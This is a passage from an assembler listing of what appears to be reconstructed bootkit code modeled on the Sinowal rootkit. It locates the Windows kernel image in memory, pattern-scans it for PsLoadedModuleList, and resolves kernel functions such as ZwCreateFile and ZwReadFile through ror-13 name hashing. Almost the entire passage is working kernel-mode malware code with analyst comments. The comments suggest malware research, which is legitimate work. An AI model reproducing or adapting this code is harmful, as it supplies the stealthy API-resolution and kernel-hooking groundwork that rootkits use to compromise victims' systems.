   584 000003AC 66813B4D5A              cmp word [ebx],'MZ'    ; DOS Header found?
   585 000003B1 75F3                    jnz Find_Exception_Handler_PE_Image
   586 000003B3 8B433C                  mov eax,[ebx+0x3c]    ; get address of PE Header (skip DOS Header/Stub)
   587 000003B6 3D00200000              cmp eax,2 * 4096     ; check range (PE Header must be within 8192 bytes)
   588 000003BB 73E9                    jnc Find_Exception_Handler_PE_Image
   589 000003BD 813C0350450000          cmp dword [ebx+eax],'PE'
   590 000003C4 75E0                    jnz Find_Exception_Handler_PE_Image
   591                                  
   592                                  ; obfuscation call
   593                                  ;   [esp] contains then pointer to data
   594                                  ;         has been seen in previous Sinowal version for getting PhysicalDrive string
   595 000003C6 E81C000000              call dword Obfuscation_Call
   596                                  
   597                                  ; standard API hashes (all of ntoskrnl)
   598 000003CB 62E00737                ExAllocatePool    dd    03707E062h  ; ebp-24
   599 000003CF 1F9D489D                ExFrePool         dd    09D489D1Fh  ; ebp-20
   600 000003D3 A8C57D3E                KeLoaderBlock     dd    03E7DC5A8h  ; ebp-16 (unused)
   601 000003D7 5F4CD4DC                ZwClose           dd    0DCD44C5Fh  ; ebp-12
   602 000003DB 9D8F8803                ZwCreateFile      dd    003888F9Dh  ; ebp-8
   603 000003DF 16D5FC84                ZwReadFile        dd    084FCD516h  ; ebp-4
   604 000003E3 00000000                                  dd    000000000h  ; hash zero terminator (no more hash following)
   605                                  ; here execution flow goes on..
   606                                  Obfuscation_Call:
   607                                  ; get absolute address of PE Image the exception handler exists in, to scan it
   608 000003E7 8D1403                  lea edx,[ebx+eax]                                                               ; edx = absolute address of PE Header
   609 000003EA 8B4A50                  mov ecx,[edx+0x50]                                                              ; SizeOfImage
   610 000003ED 89DF                    mov edi,ebx                                                                     ; edi = address of PE image (of DOS header)
   611                                  
   612                                  ; scan 74 E3 39 05
   613                                  ;_text:004E936E 74 E3                                   jz      short loc_4E9353
   614                                  ;_text:004E9370 39 05 30 CE 54 00                       cmp     ds:_PsLoadedModuleList, eax
   615                                  ; 74 DB 
   616 000003EF B074                    mov al,74h
   617                                  Scan_PsLoadedModuleList:
   618 000003F1 F2AE                    repne scasb
   619 000003F3 7515                    jnz Image_Parsing_done
   620 000003F5 817FFF74E33905          cmp dword [edi-1],0x0539E374
   621 000003FC 75F3                    jnz Scan_PsLoadedModuleList
   622 000003FE 66817F0774DB            cmp word [edi + 7],0xdb74
   623 00000404 75EB                    jnz Scan_PsLoadedModuleList
   624                                  
   625                                  Found_Signature:
   626 00000406 4F                      dec edi  ; found the code signature, extract PsLoadedModuleList
   627 00000407 8B4704                  mov eax,[edi+0x4]    ; store PsLoadedModuleList pointer in eax 
   628                                  
   629                                  Image_Parsing_done:
   630                                  ; use Export Table of the PE Image to resolve the hashes
   631 0000040A 8B5278                  mov edx,[edx+0x78]   ; -> Export Table.Virtual Address
   632 0000040D 01DA                    add edx,ebx ; ebx = pointer to DOS Header / image base  (absolute address)
   633 0000040F 31C9                    xor ecx,ecx
   634 00000411 49                      dec ecx  ; ecx = -1 = 0FFFFFFFFh
   635                                  
   636                                  ; store the PsLoadedModuleList pointer on stack and resolve hashes
   637 00000412 EB3D                    jmp short Resolve_Next_Hash_StoreOnStack
   638                                  
   639                                  Next_Export:
   640                                  ;  ecx      export counter
   641                                  ;  ebx      still base of ntoskrnl image (points to DOS Header)
   642                                  ;  esi      Export Name
   643                                  ;  edi      Hash Value
   644                                  ;  [esp]    Pointer to Next Hash
   645                                  ;  ebp      Pointer to Stack Variables
   646 00000414 41                      inc ecx   ; next function to generate hash of (ecx = counter)
   647 00000415 8B7220                  mov esi,[edx+0x20] ; Export Directory Table.Name Pointer RVA
   648 00000418 01DE                    add esi,ebx    ;  (absolute address)
   649 0000041A 8B348E                  mov esi,[esi+ecx*4]   ; lookup the function name in the Name Pointer Table
   650 0000041D 01DE                    add esi,ebx     ;  (absolute address)
   651                                  
   652 0000041F 31C0                    xor eax,eax   ; will hold character (zero extended)
   653 00000421 31FF                    xor edi,edi   ; will hold hash value
   654                                  
   655                                  Generate_Hash_of_Export_Name:
   656                                  ; generates the hash of the name string, += n >> 13 is used
   657 00000423 AC                      lodsb
   658 00000424 08C0                    or al,al  ; zero termination?
   659 00000426 7407                    jz Hash_Generated 
   660 00000428 C1CF0D                  ror edi,13   ; >> 13 is used (as in previous Sinowal version!)
   661 0000042B 01C7                    add edi,eax    ; add to hash value
   662 0000042D EBF4                    jmp short Generate_Hash_of_Export_Name
   663                                  
   664                                  Hash_Generated:
   665                                  ; krrr
   666 0000042F 8B3424                  mov esi,[esp]  ; as discussed, [esp] contains pointer to hashes (because of the call)
   667 00000432 AD                      lodsd   ; get next hash
   668 00000433 09C0                    or eax,eax 
   669 00000435 7421                    jz All_Hashes_Resolved    ; if yes exit loop
   670 00000437 39C7                    cmp edi,eax       ; found correct hash?
   671 00000439 75D9                    jnz Next_Export   ; if not => next export
   672 0000043B 893424                  mov [esp],esi     ; update hash pointer
   673 0000043E 8B7A24                  mov edi,[edx+0x24]  ; Export Directory Table.Ordinal Table RVA
   674 00000441 01DF                    add edi,ebx    ;   (absolute address)
   675 00000443 0FB7044F                movzx eax,word [edi+ecx*2]        ; lookup in the Ordinal Table to get number in EAT
   676 00000447 8B7A1C                  mov edi,[edx+0x1c]     ; Export Directory Table.Export Address Table RVA
   677 0000044A 01DF                    add edi,ebx                ;   (absolute address)
   678 0000044C 8B0487                  mov eax,[edi+eax*4]           ; lookup the address
   679 0000044F 01D8                    add eax,ebx       ; w00t! found the address, store in eax and store as stack variable!
   680                                  
   681                                  Resolve_Next_Hash_StoreOnStack:
   682 00000451 87FD                    xchg edi,ebp    ; edi to point to stack variables
   683 00000453 AB                      stosd   ; store eax to variable
   684 00000454 87FD                    xchg edi,ebp  ; ebp points now to next variable...!
   685 00000456 EBBC                    jmp short Next_Export
   686                                  
   687                                  All_Hashes_Resolved:
   688 00000458 90                      nop
   689 00000459 08C0                    or al, al
   690 0000045B 08C0                    or al, al
   691 0000045D 90                      nop
   692                                  
   693                                  ;mov esp,ebp 
   694 0000045E 9D                      popfd
   695 0000045F 61                      popad
   696 00000460 C3                      ret
   697                                  
   698                                  Total_End_of_Binary:
   699 00000461 00<rept>                times 4*1024-($-$$) db 0
